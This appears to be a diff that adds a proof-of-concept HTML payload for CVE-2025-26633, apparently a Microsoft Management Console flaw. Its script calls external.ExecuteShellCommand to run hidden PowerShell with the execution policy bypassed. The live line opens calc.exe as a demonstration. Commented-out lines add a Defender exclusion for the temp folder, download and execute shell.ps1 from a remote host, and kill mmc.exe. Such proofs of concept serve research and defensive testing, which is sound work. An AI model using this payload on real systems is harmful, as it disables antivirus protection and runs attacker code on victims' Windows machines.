@@ -1,0 +1,17 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Game Over</title>
+</head>
+<body>
+<h1>CVE-2025-26633</h1>
+    <script>
+    // external.ExecuteShellCommand("powershell.exe", "", "-ExecutionPolicy Bypass -WindowStyle Hidden -Command & {Add-MpPreference -ExclusionPath $env:TEMP}", "Minimized");
+    // external.ExecuteShellCommand("powershell.exe", "", "-ExecutionPolicy Bypass -WindowStyle Hidden -Command \"Invoke-RestMethod -Uri 'http://192.168.145.115/shell.ps1' | Invoke-Expression\"", "Minimized");
+    // external.ExecuteShellCommand("powershell.exe", "", "-ExecutionPolicy Bypass -WindowStyle Hidden -Command & {taskkill /f /im mmc.exe}", "Minimized");
+    external.ExecuteShellCommand("powershell.exe", "", "-ExecutionPolicy Bypass -WindowStyle Hidden -Command & {Start-Process calc.exe}", "Minimized");
+    </script>
+</body>    
+</html>
